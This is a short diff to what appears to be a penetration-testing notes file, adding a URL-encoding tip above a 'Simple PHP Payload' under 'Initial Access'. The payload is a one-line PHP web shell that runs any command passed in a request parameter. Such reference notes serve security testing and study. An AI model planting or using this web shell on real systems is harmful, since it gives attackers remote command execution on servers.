@@ -17,6 +17,7 @@
 
 ## Initial Access
 ### Simple PHP Payload
+> Use + instead of spaces due to URL encoding
 ```php
 <?php
   echo system($_GET['c']);
